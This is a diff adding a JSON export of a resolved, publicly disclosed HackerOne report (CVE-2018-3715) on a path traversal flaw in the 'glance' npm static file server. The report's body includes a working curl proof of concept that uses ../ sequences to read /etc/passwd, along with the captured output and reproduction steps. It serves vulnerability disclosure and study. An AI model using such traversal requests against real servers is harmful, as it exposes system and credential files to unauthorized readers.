@@ -1,0 +1,134 @@
+{
+  "id": 310106,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTAxMDY=",
+  "url": "https://hackerone.com/reports/310106",
+  "title": "[glance] Path Traversal in glance static file server allows to read content of arbitrary file",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-29T10:34:13.032Z",
+  "submitted_at": "2018-01-29T10:34:13.032Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3715"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-03-04T11:54:56.505Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-02-02T11:54:45.362Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\nThere is Path Traversal vulnerability in ```glance``` module. This issue allows to read arbitrary files from the server, where ```glance``` is installed.\n\n## Module\n\n**glance**\n\na quick disposable http server for static files\n\nhttps://www.npmjs.com/package/glance\n\nStats\n33 downloads in the last day\n34 downloads in the last week\n269 downloads in the last month\n\n~3000 estimated downloads per year\n\n## Description\n\n```glance``` serves files from the server where was installed. No path sanitization is implemented, thus malicious user is able to read content of any file from the server using simple ```curl``` command (adjust number of ../ to reflect your system):\n\n```\ncurl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\n```\n\nThe result:\n\n```\nme:~/playground/hackerone/Node$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\n*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET /../../../../../../etc/passwd HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< content-type: application/octet-stream\n< etag: 6d51e6677c898282619137b0c74f0cab\n< last-modified: Fri, 26 Jan 2018 12:04:19 +0000\n< content-length: 2559\n< Date: Mon, 29 Jan 2018 10:23:45 GMT\n< Connection: keep-alive\n< \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n(..)\nguest-cz1ton:x:999:999:Guest:/tmp/guest-cz1ton:/bin/bash\npostgres:x:124:131:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n* Connection #0 to host 127.0.0.1 left intact\nme:~/playground/hackerone/Node$\n```\n\n## Steps To Reproduce:\n\n- install ```glance```:\n\n```\n$ npm install glance\n```\n\n- run ```glance``` in direcotry of your choice\n\n```\nme:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/\nglance serving node_modules/ on port 8080\n::1 read node_modules/\n::1 read node_modules/bash-color/\n::1 read node_modules/bash-color/README.md\n::1 read ./\n::1 read malware_frame.html\n::1 read malware.js\nERR404 ::ffff:127.0.0.1 on ../../../etc/passwd\nERR404 ::ffff:127.0.0.1 on ../../../../etc/passwd\n::ffff:127.0.0.1 read ../../../../../etc/passwd\n::ffff:127.0.0.1 read ../../../../../etc/passwd\n```\n\nYou can see in the log above all my requests sent to ```glance```, including ```curl``` requests from PoC, where I was able to traverse directory tree and read content of ```/etc/passwd``` file\n\n## Supporting Material/References:\n\n- Ubuntu 16.04 LTS\n- Chromium 66.0.3333.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.4 LTS\n- npm version: 5.6.0\n- curl 7.47.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows malicious user to read content of arbitrary file from the server.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-03-04T11:54:45.453Z",
+  "allow_singular_disclosure_after": -258176155.4302787,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "muon4",
+    "whitesector",
+    "eveeez",
+    "khalooda0x",
+    "t4ym",
+    "hassham",
+    "japz"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 6772,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "glance",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
